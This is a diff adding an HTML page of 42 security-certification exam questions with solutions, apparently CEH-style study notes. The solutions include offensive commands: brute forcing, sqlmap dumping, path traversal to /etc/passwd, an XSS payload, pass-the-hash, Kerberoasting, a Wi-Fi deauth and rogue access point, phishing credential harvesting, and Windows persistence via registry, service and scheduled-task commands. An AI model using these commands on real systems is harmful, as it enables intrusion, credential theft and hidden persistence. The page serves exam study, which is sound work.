@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Security Assessment Exam Questions</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f8f8f8;
+            padding: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #333;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            font-style: italic;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        
+        .toc {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .toc h2 {
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .toc ul {
+            columns: 2;
+            list-style-type: none;
+        }
+        
+        .toc li {
+            margin-bottom: 8px;
+        }
+        
+        .toc a {
+            color: #333;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .toc a:hover {
+            color: #666;
+            text-decoration: underline;
+        }
+        
+        .category {
+            margin: 40px 0;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .category-title {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #ddd;
+            color: #333;
+        }
+        
+        .questions-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        
+        .question-card {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .question-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .question-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .question-number {
+            font-weight: bold;
+            font-size: 1.2rem;
+            background-color: #333;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 3px;
+        }
+        
+        .question-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+        
+        .question-content {
+            margin-bottom: 15px;
+        }
+        
+        .solution {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 3px solid #333;
+            font-size: 0.9rem;
+        }
+        
+        .command {
+            font-family: 'Courier New', monospace;
+            background-color: #eee;
+            padding: 5px;
+            border-radius: 3px;
+            margin: 5px 0;
+            display: block;
+            overflow-x: auto;
+        }
+        
+        .tool-reference {
+            font-style: italic;
+            color: #555;
+            margin-top: 10px;
+            font-size: 0.9rem;
+        }
+        
+        footer {
+            margin-top: 40px;
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
+            color: #777;
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .questions-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .toc ul {
+                columns: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>COMPLETE SECURITY ASSESSMENT EXAM QUESTIONS</h1>
+        <p class="subtitle">Comprehensive penetration testing scenarios and solutions for security certification exams</p>
+    </header>
+
+    <div class="toc">
+        <h2>Table of Contents</h2>
+        <ul>
+            <li><a href="#basic-scenarios">Basic Security Assessment Scenarios (Q1-Q20)</a></li>
+            <li><a href="#network-recon">Network Reconnaissance & Enumeration (Q21-Q23)</a></li>
+            <li><a href="#web-apps">Web Application Security (Q24-Q26)</a></li>
+            <li><a href="#password-crypto">Password Attacks & Cryptography (Q27-Q29)</a></li>
+            <li><a href="#wireless">Wireless Security (Q30-Q31)</a></li>
+            <li><a href="#forensics">Forensics & Incident Response (Q32-Q34)</a></li>
+            <li><a href="#reverse-engineering">Reverse Engineering & Malware Analysis (Q35-Q36)</a></li>
+            <li><a href="#social-engineering">Social Engineering (Q37-Q38)</a></li>
+            <li><a href="#privilege-escalation">Privilege Escalation (Q39-Q40)</a></li>
+            <li><a href="#persistence">Advanced Persistence (Q41-Q42)</a></li>
+        </ul>
+    </div>
+
+    <!-- Basic Security Assessment Scenarios -->
+    <div class="category" id="basic-scenarios">
+        <h2 class="category-title">BASIC SECURITY ASSESSMENT SCENARIOS</h2>
+        <div class="questions-container">
+            <!-- Q1 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q1</span>
+                </div>
+                <div class="question-title">Operating System Identification via SQLi Vulnerability</div>
+                <div class="question-content">
+                    After discovering a blind SQLi vulnerability in a MySQL-backed website, identify the host OS.
+                </div>
+                <div class="solution">
+                    <span class="command">nmap -sV &lt;IP&gt;/24</span>
+                    <span class="command">nmap -A &lt;IP&gt;/24</span>
+                    Identify machine with port 3306 open, then:
+                    <span class="command">nmap -O &lt;IP&gt;</span>
+                </div>
+            </div>
+            
+            <!-- Q2 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q2</span>
+                </div>
+                <div class="question-title">Suspicious Account Detection</div>
+                <div class="question-content">
+                    Identify suspicious user account on machine 192.168.1.10 from secure accounts: JohnDoe, SarahConnor, Neo, Oracle, Sherlock.
+                </div>
+                <div class="solution">
+                    RDP to machine, then:
+                    <span class="command">net user</span>
+                    Compare against known secure accounts to identify suspicious entry.
+                </div>
+            </div>
+            
+            <!-- Q3 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q3</span>
+                </div>
+                <div class="question-title">RDP Service Discovery</div>
+                <div class="question-content">
+                    Find machine with RDP port open in network.
+                </div>
+                <div class="solution">
+                    <span class="command">nmap -Pn -sV -p 3389 &lt;IP&gt;</span>
+                </div>
+            </div>
+            
+            <!-- Q4 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q4</span>
+                </div>
+                <div class="question-title">DES Encryption & FTP Access</div>
+                <div class="question-content">
+                    Decrypt DES(ECB) encrypted file to obtain FTP credentials, retrieve flag1.txt.
+                </div>
+                <div class="solution">
+                    Use Cryptool: Encrypt/Decrypt → Symmetric → DES (ECB)
+                    <span class="command">ftp &lt;IP&gt;</span>
+                    <span class="command">get flag1.txt</span>
+                </div>
+            </div>
+            
+            <!-- Q5 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q5</span>
+                </div>
+                <div class="question-title">Steganography Detection</div>
+                <div class="question-content">
+                    Extract hidden information from Secret-Accounts.txt using steganography (password: "magic").
+                </div>
+                <div class="solution">
+                    <span class="command">snow -C -p "magic" secret.accounts.txt</span>
+                </div>
+            </div>
+            
+            <!-- Q6 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q6</span>
+                </div>
+                <div class="question-title">WordPress Password Recovery</div>
+                <div class="question-content">
+                    Retrieve Sarah's WordPress password from database at http://192.168.1.10:8080/CEH.
+                </div>
+                <div class="solution">
+                    <span class="command">wpscan --url http://192.168.1.10:8080/CEH -u Sarah -P passwdlist.txt</span>
+                    <div class="tool-reference">Alternative: Metasploit wordpress_login_enum module</div>
+                </div>
+            </div>
+            
+            <!-- Q7 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q7</span>
+                </div>
+                <div class="question-title">MD5 Hash Cracking</div>
+                <div class="question-content">
+                    Crack MD5 hash in Secret-Hash.txt uploaded via DVWA.
+                </div>
+                <div class="solution">
+                    Access file at: C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt
+                    Use online tools: http://hashes.com/en/decrypt/hash or https://crackstation.net
+                </div>
+            </div>
+            
+            <!-- Q8 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q8</span>
+                </div>
+                <div class="question-title">Backdoor File Access</div>
+                <div class="question-content">
+                    Retrieve secret.txt from Server 2019 machine using backdoor.
+                </div>
+                <div class="solution">
+                    Use RDP credentials from Q2, navigate to:
+                    C:\users\dell\documents\confidential\secret.txt
+                </div>
+            </div>
+            
+            <!-- Q9 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q9</span>
+                </div>
+                <div class="question-title">DoS Attack Source Identification</div>
+                <div class="question-content">
+                    Identify attacking IP from pcapng file.
+                </div>
+                <div class="solution">
+                    Wireshark: Statistics → IPv4 Statistics → Source and Destination Addresses
+                    Filter: <span class="command">tcp.flags.syn == 1 and tcp.flags.ack == 0</span>
+                </div>
+            </div>
+            
+            <!-- Q10 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q10</span>
+                </div>
+                <div class="question-title">DDoS & Credential Analysis</div>
+                <div class="question-content">
+                    Identify number of attacking machines or find credentials in pcap.
+                </div>
+                <div class="solution">
+                    DDoS: Count unique IPs in Conversations tab
+                    Credentials: Filter <span class="command">http.request.method == POST</span>
+                </div>
+            </div>
+            
+            <!-- Q11 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q11</span>
+                </div>
+                <div class="question-title">FTP Credential Cracking</div>
+                <div class="question-content">
+                    Crack FTP credentials to retrieve flag.txt.
+                </div>
+                <div class="solution">
+                    Identify machine with port 21 open
+                    <span class="command">hydra -L users.txt -P passwords.txt &lt;IP&gt; ftp</span>
+                </div>
+            </div>
+            
+            <!-- Q12 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q12</span>
+                </div>
+                <div class="question-title">Remote Desktop File Retrieval</div>
+                <div class="question-content">
+                    Remotely access John's computer (Server2019) to retrieve document starting with "F/XXXXXXX".
+                </div>
+                <div class="solution">
+                    RDP with credentials: John/secure123
+                    Browse to desktop and locate target file.
+                </div>
+            </div>
+            
+            <!-- Q13 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q13</span>
+                </div>
+                <div class="question-title">SQL DSSS Attack</div>
+                <div class="question-content">
+                    Use SQL DSSS technique to find contact number of "Kety" on moviescope.com.
+                </div>
+                <div class="solution">
+                    <span class="command">sqlmap -u "http://moviescope.com/viewprofile.php?id=1" --dump --batch --threads=10</span>
+                    <div class="tool-reference">DSSS: Stealth, Speed and Success technique</div>
+                </div>
+            </div>
+            
+            <!-- Q14 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q14</span>
+                </div>
+                <div class="question-title">Plain Text Credential Extraction</div>
+                <div class="question-content">
+                    Find plaintext credentials for www.industry.com in Dos.pcapng.
+                </div>
+                <div class="solution">
+                    Wireshark filter: <span class="command">http.request.method == POST</span>
+                    Examine packet contents for username/password.
+                </div>
+            </div>
+            
+            <!-- Q15 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q15</span>
+                </div>
+                <div class="question-title">Risky HTTP Method Identification</div>
+                <div class="question-content">
+                    Identify HTTP method posing highest risk on www.moviescope.com using OWASP ZAP.
+                </div>
+                <div class="solution">
+                    OWASP ZAP Automated Scan → Check Alerts for SQLi vulnerabilities
+                    Typically POST method for SQL injection attacks.
+                </div>
+            </div>
+            
+            <!-- Q16 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q16</span>
+                </div>
+                <div class="question-title">Live Host Discovery</div>
+                <div class="question-content">
+                    Identify number of alive hosts in subnet.
+                </div>
+                <div class="solution">
+                    <span class="command">nmap -sn 192.168.56.0/24</span>
+                </div>
+            </div>
+            
+            <!-- Q17 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q17</span>
+                </div>
+                <div class="question-title">VeraCrypt Decryption</div>
+                <div class="question-content">
+                    Decrypt VeraCrypt file with password "test" to find secret code.
+                </div>
+                <div class="solution">
+                    Mount VeraCrypt volume using password "test"
+                    Access decrypted content to locate secret.
+                </div>
+            </div>
+            
+            <!-- Q18 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q18</span>
+                </div>
+                <div class="question-title">RC4 Decryption</div>
+                <div class="question-content">
+                    Decrypt "Cry-RC4-Accountno.hex" using key "14" to find account number.
+                </div>
+                <div class="solution">
+                    Cryptool: Encrypt/Decrypt → Symmetric → RC4
+                    Set key to "14" and decrypt.
+                </div>
+            </div>
+            
+            <!-- Q19 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q19</span>
+                </div>
+                <div class="question-title">Android File Extraction</div>
+                <div class="question-content">
+                    Access Android device to retrieve secret.txt.
+                </div>
+                <div class="solution">
+                    <span class="command">adb connect &lt;IP&gt;:5555</span>
+                    <span class="command">adb shell</span>
+                    <span class="command">find /sdcard -name "secret.txt"</span>
+                </div>
+            </div>
+            
+            <!-- Q20 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q20</span>
+                </div>
+                <div class="question-title">Encoded IP Address Decryption</div>
+                <div class="question-content">
+                    Decode file to extract IP address of compromised machine (password: shadow123).
+                </div>
+                <div class="solution">
+                    Use BCTextEncoder tool with password "shadow123" to decode.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Network Reconnaissance & Enumeration -->
+    <div class="category" id="network-recon">
+        <h2 class="category-title">NETWORK RECONNAISSANCE & ENUMERATION</h2>
+        <div class="questions-container">
+            <!-- Q21 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q21</span>
+                </div>
+                <div class="question-title">SMB Share Enumeration</div>
+                <div class="question-content">
+                    Enumerate SMB shares on target machine 192.168.1.25 and identify accessible shares.
+                </div>
+                <div class="solution">
+                    <span class="command">nmap --script smb-enum-shares -p445 192.168.1.25</span>
+                    <span class="command">smbclient -L //192.168.1.25 -N</span>
+                </div>
+            </div>
+
+            <!-- Q22 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q22</span>
+                </div>
+                <div class="question-title">DNS Zone Transfer</div>
+                <div class="question-content">
+                    Attempt DNS zone transfer for domain internal.corp and list all discovered hosts.
+                </div>
+                <div class="solution">
+                    <span class="command">nslookup -type=ns internal.corp</span>
+                    <span class="command">dig @ns1.internal.corp internal.corp AXFR</span>
+                </div>
+            </div>
+
+            <!-- Q23 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q23</span>
+                </div>
+                <div class="question-title">SNMP Enumeration</div>
+                <div class="question-content">
+                    Enumerate SNMP on target using public community string and extract system information.
+                </div>
+                <div class="solution">
+                    <span class="command">snmpwalk -c public -v1 192.168.1.30 1.3.6.1.2.1.1</span>
+                    <span class="command">snmp-check 192.168.1.30 -c public</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Web Application Security -->
+    <div class="category" id="web-apps">
+        <h2 class="category-title">WEB APPLICATION SECURITY</h2>
+        <div class="questions-container">
+            <!-- Q24 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q24</span>
+                </div>
+                <div class="question-title">XSS Vulnerability Detection</div>
+                <div class="question-content">
+                    Identify and demonstrate XSS vulnerability in search functionality at http://vulnerable-site.com/search.php.
+                </div>
+                <div class="solution">
+                    Test payload: <span class="command">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+                    Use Burp Suite or ZAP to automate detection
+                </div>
+            </div>
+
+            <!-- Q25 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q25</span>
+                </div>
+                <div class="question-title">File Inclusion Vulnerability</div>
+                <div class="question-content">
+                    Exploit LFI vulnerability to read /etc/passwd on Linux target.
+                </div>
+                <div class="solution">
+                    <span class="command">http://target.com/page.php?file=../../../etc/passwd</span>
+                    Use null bytes or path traversal techniques
+                </div>
+            </div>
+
+            <!-- Q26 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q26</span>
+                </div>
+                <div class="question-title">CSRF Token Bypass</div>
+                <div class="question-content">
+                    Bypass CSRF protection to change user password without valid token.
+                </div>
+                <div class="solution">
+                    Remove token parameter entirely
+                    Use same token for multiple requests
+                    <span class="command">Burp Suite: CSRF PoC generator</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Password Attacks & Cryptography -->
+    <div class="category" id="password-crypto">
+        <h2 class="category-title">PASSWORD ATTACKS & CRYPTOGRAPHY</h2>
+        <div class="questions-container">
+            <!-- Q27 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q27</span>
+                </div>
+                <div class="question-title">Pass-the-Hash Attack</div>
+                <div class="question-content">
+                    Use captured NTLM hash to authenticate to Windows target without knowing plaintext password.
+                </div>
+                <div class="solution">
+                    <span class="command">pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.50 cmd</span>
+                </div>
+            </div>
+
+            <!-- Q28 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q28</span>
+                </div>
+                <div class="question-title">Kerberoasting</div>
+                <div class="question-content">
+                    Extract service account hashes from Active Directory for offline cracking.
+                </div>
+                <div class="solution">
+                    <span class="command">GetUserSPNs.py -request -dc-ip 192.168.1.100 domain/user</span>
+                    Crack with hashcat: <span class="command">hashcat -m 13100 hashes.txt wordlist.txt</span>
+                </div>
+            </div>
+
+            <!-- Q29 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q29</span>
+                </div>
+                <div class="question-title">John the Ripper Rule Modification</div>
+                <div class="question-content">
+                    Create custom John rules to crack passwords with company-specific patterns.
+                </div>
+                <div class="solution">
+                    Edit john.conf: <span class="command">[List.Rules:Custom]</span>
+                    Example rule: <span class="command">cAz"[0-9]"</span> (capitalize, append digit)
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wireless Security -->
+    <div class="category" id="wireless">
+        <h2 class="category-title">WIRELESS SECURITY</h2>
+        <div class="questions-container">
+            <!-- Q30 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q30</span>
+                </div>
+                <div class="question-title">WPA2 Handshake Capture</div>
+                <div class="question-content">
+                    Capture WPA2 handshake from target network "CorporateWiFi" for offline cracking.
+                </div>
+                <div class="solution">
+                    <span class="command">airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</span>
+                    Deauth attack: <span class="command">aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF wlan0mon</span>
+                </div>
+            </div>
+
+            <!-- Q31 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q31</span>
+                </div>
+                <div class="question-title">Rogue Access Point</div>
+                <div class="question-content">
+                    Set up rogue AP with same SSID as corporate network to capture credentials.
+                </div>
+                <div class="solution">
+                    <span class="command">airbase-ng -a AA:BB:CC:DD:EE:FF --essid "CorporateWiFi" -c 6 wlan0mon</span>
+                    Configure DHCP and routing for man-in-the-middle position
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Forensics & Incident Response -->
+    <div class="category" id="forensics">
+        <h2 class="category-title">FORENSICS & INCIDENT RESPONSE</h2>
+        <div class="questions-container">
+            <!-- Q32 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q32</span>
+                </div>
+                <div class="question-title">Memory Dump Analysis</div>
+                <div class="question-content">
+                    Analyze memory dump to identify malicious processes and extract indicators of compromise.
+                </div>
+                <div class="solution">
+                    <span class="command">volatility -f memory.dmp imageinfo</span>
+                    <span class="command">volatility -f memory.dmp --profile=Win7SP1x64 pslist</span>
+                    <span class="command">volatility -f memory.dmp --profile=Win7SP1x64 malfind</span>
+                </div>
+            </div>
+
+            <!-- Q33 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q33</span>
+                </div>
+                <div class="question-title">Log Analysis for Intrusion Detection</div>
+                <div class="question-content">
+                    Analyze Apache logs to identify SQL injection attempts and extract attacker IP.
+                </div>
+                <div class="solution">
+                    <span class="command">grep -i "union\|select\|1=1" access.log</span>
+                    <span class="command">cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr</span>
+                </div>
+            </div>
+
+            <!-- Q34 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q34</span>
+                </div>
+                <div class="question-title">Timeline Analysis</div>
+                <div class="question-content">
+                    Create timeline of file system activity to determine attack timeframe.
+                </div>
+                <div class="solution">
+                    <span class="command">log2timeline.py plaso.dump image.raw</span>
+                    <span class="command">psort.py -o l2tcsv -w timeline.csv plaso.dump</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Reverse Engineering & Malware Analysis -->
+    <div class="category" id="reverse-engineering">
+        <h2 class="category-title">REVERSE ENGINEERING & MALWARE ANALYSIS</h2>
+        <div class="questions-container">
+            <!-- Q35 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q35</span>
+                </div>
+                <div class="question-title">Static Analysis of Suspicious Executable</div>
+                <div class="question-content">
+                    Perform static analysis on malware.exe to identify persistence mechanism and C2 server.
+                </div>
+                <div class="solution">
+                    Use strings: <span class="command">strings malware.exe | grep -E "(http|https|\.com|\.org)"</span>
+                    PE analysis: <span class="command">peframe malware.exe</span>
+                    <span class="command">capa malware.exe</span>
+                </div>
+            </div>
+
+            <!-- Q36 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q36</span>
+                </div>
+                <div class="question-title">Dynamic Analysis in Sandbox</div>
+                <div class="question-content">
+                    Execute malware in controlled environment and monitor behavior.
+                </div>
+                <div class="solution">
+                    Use Cuckoo Sandbox or Any.run
+                    Monitor: Registry changes, file system activity, network connections
+                    Tools: Process Monitor, Wireshark, API monitors
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Social Engineering -->
+    <div class="category" id="social-engineering">
+        <h2 class="category-title">SOCIAL ENGINEERING</h2>
+        <div class="questions-container">
+            <!-- Q37 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q37</span>
+                </div>
+                <div class="question-title">Phishing Email Creation</div>
+                <div class="question-content">
+                    Create convincing phishing email to harvest credentials from target organization.
+                </div>
+                <div class="solution">
+                    Use SET: <span class="command">setoolkit</span>
+                    Select: 1) Social-Engineering Attacks → 2) Website Attack Vectors → 3) Credential Harvester
+                    Clone legitimate login page and deploy
+                </div>
+            </div>
+
+            <!-- Q38 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q38</span>
+                </div>
+                <div class="question-title">USB Drop Attack</div>
+                <div class="question-content">
+                    Create malicious USB device that automatically executes payload when inserted.
+                </div>
+                <div class="solution">
+                    Use Rubber Ducky or Bash Bunny
+                    Create autorun.inf for Windows or .desktop files for Linux
+                    Payload: Reverse shell or credential harvesting
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Privilege Escalation -->
+    <div class="category" id="privilege-escalation">
+        <h2 class="category-title">PRIVILEGE ESCALATION</h2>
+        <div class="questions-container">
+            <!-- Q39 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q39</span>
+                </div>
+                <div class="question-title">Windows Privilege Escalation</div>
+                <div class="question-content">
+                    Escalate privileges from user to SYSTEM on Windows 10 target.
+                </div>
+                <div class="solution">
+                    Check: <span class="command">whoami /priv</span>
+                    Exploit: Unquoted service paths, vulnerable drivers, token manipulation
+                    Tools: PowerSploit, WinPEAS, Seatbelt
+                </div>
+            </div>
+
+            <!-- Q40 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q40</span>
+                </div>
+                <div class="question-title">Linux Privilege Escalation</div>
+                <div class="question-content">
+                    Escalate to root on Ubuntu 18.04 target with misconfigured sudo rights.
+                </div>
+                <div class="solution">
+                    Check: <span class="command">sudo -l</span>
+                    <span class="command">find / -perm -4000 2>/dev/null</span>
+                    <span class="command">linpeas.sh</span>
+                    Exploit: SUID binaries, cron jobs, kernel exploits
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Advanced Persistence -->
+    <div class="category" id="persistence">
+        <h2 class="category-title">ADVANCED PERSISTENCE</h2>
+        <div class="questions-container">
+            <!-- Q41 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q41</span>
+                </div>
+                <div class="question-title">Windows Persistence Mechanisms</div>
+                <div class="question-content">
+                    Establish multiple persistence mechanisms on compromised Windows host.
+                </div>
+                <div class="solution">
+                    Registry: <span class="command">reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"</span>
+                    Services: <span class="command">sc create PersistService binPath= "C:\malware.exe" start= auto</span>
+                    Scheduled Tasks: <span class="command">schtasks /create /tn "Cleanup" /tr "C:\malware.exe" /sc hourly</span>
+                </div>
+            </div>
+
+            <!-- Q42 -->
+            <div class="question-card">
+                <div class="question-header">
+                    <span class="question-number">Q42</span>
+                </div>
+                <div class="question-title">Linux Rootkit Detection</div>
+                <div class="question-content">
+                    Detect and analyze rootkit on compromised Linux system.
+                </div>
+                <div class="solution">
+                    <span class="command">chkrootkit</span>
+                    <span class="command">rkhunter --check</span>
+                    <span class="command">lsmod | grep -i suspicious</span>
+                    File integrity: <span class="command">aide --check</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>Complete Security Assessment Exam Questions | Comprehensive Penetration Testing Reference</p>
+        <p>Note: This document is for educational and authorized security assessment purposes only.</p>
+    </footer>
+</body>
+</html>
